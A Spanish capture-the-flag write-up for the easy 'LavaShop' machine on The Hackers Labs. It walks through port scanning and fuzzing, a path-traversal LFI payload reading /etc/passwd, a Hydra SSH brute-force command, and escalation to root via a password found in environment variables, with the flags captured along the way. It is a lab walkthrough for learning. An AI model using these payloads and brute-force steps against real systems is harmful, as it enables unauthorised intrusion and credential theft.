# 🛒 LavaShop

```bash
┌──(Harou㉿kali)-[~/writeups/lavashop]
└─$ cat info.txt

  Plataforma  : The Hackers Labs
  Dificultad  : 🟢 Fácil
  Sistema     : Linux (Debian)
  Fecha       : 17/03/2026
  Estado      : ✅ Completada
```

---

## 🎯 `cat objetivo.txt`

> Máquina Linux con una tienda web vulnerable a LFI (Local File Inclusion).
> El objetivo es explotar el parámetro vulnerable para leer archivos del sistema,
> identificar usuarios, acceder vía SSH y escalar privilegios aprovechando
> una contraseña expuesta en variables de entorno.

---

## 🔍 `./reconnaissance.sh`

### Escaneo completo de puertos

```bash
nmap -p- -sS --open --min-rate 5000 -T4 -n -v -oN all_ports.nmap <IP>
```

**Puertos abiertos:**
| Puerto | Servicio | Notas |
|--------|----------|-------|
| 22/TCP | SSH | Administración remota |
| 80/TCP | HTTP | Servidor web — LavaShop |
| 1337/TCP | Desconocido | Puerto no estándar |

---

## 🕵️ `./enumeration.sh`

### Enumeración web

El sitio carga contenido dinámicamente mediante el parámetro `?page=` — señal de posible vulnerabilidad LFI.

### Fuzzing de directorios

```bash
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Carpetas críticas encontradas:**
```
/pages/     → contiene archivos PHP de la tienda
/includes/  → archivos de configuración internos
```

### Fuzzing de parámetros ocultos

```bash
wfuzz -u http://<IP>/pages/products.php?file=FUZZ \
      -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
      --hw [word_count]
```

**Hallazgo:** Parámetro oculto `file` en `/pages/products.php`.
El flag `--hw` filtra respuestas genéricas y deja visible la anomalía.

---

## ⚡ `./exploitation.sh`

### Vulnerabilidad — LFI (Local File Inclusion)

El parámetro `file` no valida correctamente la entrada del usuario, permitiendo leer archivos internos del servidor.

**Payload:**
```
http://<IP>/pages/products.php?file=../../../../etc/passwd
```

**Resultado — usuarios del sistema identificados:**
```
debian
Rodri
```

### Fuerza bruta SSH

Con el usuario `debian` identificado, se lanza ataque con Hydra:

```bash
hydra -l debian -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4
```

**Credenciales obtenidas:**
```
Usuario   : debian
Contraseña: 12345
```

### Acceso inicial

```bash
ssh debian@<IP>
```

---

## 🏁 `cat flags.txt`

### User flag

```bash
cat /home/debian/user.txt
```

```
13dc7b1266b4aa6ca4cdab36b1596025
```

---

## 🚀 `./privesc.sh`

### Enumeración post-explotación — variables de entorno

```bash
env
```

**Hallazgo crítico:** Contraseña de root expuesta en texto plano en una variable de entorno:

```
ROOT_PASS=lalocadelaslamparas
```

### Escalada de privilegios

```bash
su root
# Contraseña: lalocadelaslamparas
```

**Resultado:** Acceso total como root — `uid=0`.

### Root flag

```bash
cat /root/root.txt
```

```
60493ecb4b8037433e584995b122c097
```

---

## 🧠 `cat lecciones.txt`

- 💡 Los parámetros GET como `?page=` o `?file=` son candidatos directos a LFI — siempre probarlos.
- 💡 El flag `--hw` de wfuzz es muy útil para filtrar ruido y encontrar anomalías reales.
- 💡 LFI sobre `/etc/passwd` permite enumerar usuarios del sistema sin credenciales.
- 💡 Las variables de entorno (`env`) pueden contener secretos en texto plano — revisarlas siempre en post-explotación.
- 💡 Contraseñas simples como `12345` siguen siendo muy comunes — la fuerza bruta con rockyou.txt es efectiva.

---

## 🛠️ `cat herramientas.txt`

```
nmap · ffuf · wfuzz · hydra · ssh
```

---

## 🔗 `cat referencias.txt`

```
LFI explicado    : https://owasp.org/www-project-web-security-testing-guide/
GTFOBins         : https://gtfobins.github.io
The Hackers Labs : https://thehackerslabs.com
```

---

<div align="center">

*`📚 Writeup educativo — The Hackers Labs | LavaShop | Fácil`*

</div>
